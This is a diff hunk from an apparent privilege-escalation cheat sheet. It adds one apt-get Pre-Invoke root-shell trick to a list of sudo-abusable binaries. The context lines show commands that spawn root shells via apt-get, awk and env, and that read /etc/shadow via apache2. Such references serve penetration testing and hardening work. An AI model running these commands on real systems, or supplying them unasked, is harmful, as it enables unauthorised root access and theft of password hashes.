@@ -176,6 +176,7 @@ sudo su or sudo bash                            If the current user is listed in
 - Abusing binaries
 sudo apache2 -f /etc/shadow                     A way to view a system file
 sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash -i"
+sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
 sudo apt-get changelog apt                      !/bin/sh then hit enter
 sudo awk 'BEGIN {system("/bin/bash")}'
 sudo env /bin/bash
